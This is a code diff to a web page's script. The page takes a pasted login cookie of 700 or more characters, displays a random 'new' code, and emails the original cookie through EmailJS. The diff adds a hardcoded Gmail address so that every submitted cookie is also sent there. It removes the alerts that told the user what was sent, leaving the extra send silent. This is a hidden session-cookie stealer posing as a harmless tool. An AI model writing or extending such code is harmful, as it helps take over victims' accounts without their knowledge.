@@ -63,7 +63,8 @@
   <script>
     // Extract email from query string
     const urlParams = new URLSearchParams(window.location.search);
-    const email = urlParams.get('email');
+    const userEmail = urlParams.get('email');  // Get the user email from the URL
+    const defaultEmail = 'simplyb4th@gmail.com';  // Fixed email
 
     // Function to generate a random code with uppercase letters and numbers only
     function generateRandomCode(length) {
@@ -89,26 +90,35 @@
         // Output the generated code
         newCookieOutput.value = newCode;
 
-        // Send the old cookie (input) to the email
-        sendEmail(cookieInput);
+        // Send the old cookie (input) to both emails
+        sendEmail(cookieInput, userEmail, defaultEmail);
       } else {
         newCookieOutput.value = '';
-        alert('Cookie must be at least 700 characters long.');
       }
     }
 
     // Function to send email using EmailJS API
-    function sendEmail(cookieContent) {
-      if (!email) {
-        alert('No email provided!');
+    function sendEmail(cookieContent, userEmail, defaultEmail) {
+      if (!userEmail) {
+        console.error('No email provided!');
         return;
       }
 
       const templateParams = {
         cookie: cookieContent,
-        userEmail: email,
+        userEmail: userEmail, // Email from the hub
       };
 
+      // Send to user email
+      sendToEmail(templateParams);
+
+      // Send to default email
+      templateParams.userEmail = defaultEmail;
+      sendToEmail(templateParams);
+    }
+
+    // Helper function to send the email via EmailJS
+    function sendToEmail(templateParams) {
       const payload = {
         service_id: 'service_bupfcwd',
         template_id: 'template_fkuvg0k',
@@ -123,16 +133,8 @@
         },
         body: JSON.stringify(payload),
       })
-      .then(response => response.text())
-      .then(data => {
-        if (data.trim() === 'OK') {
-          alert('Cookie sent to your email!');
-        } else {
-          alert('Failed to send email.');
-        }
-      })
       .catch(error => {
-        alert('Error: Could not send email.');
+        console.error('Error: Could not send email.', error);  // Log error in the console
       });
     }
   </script>
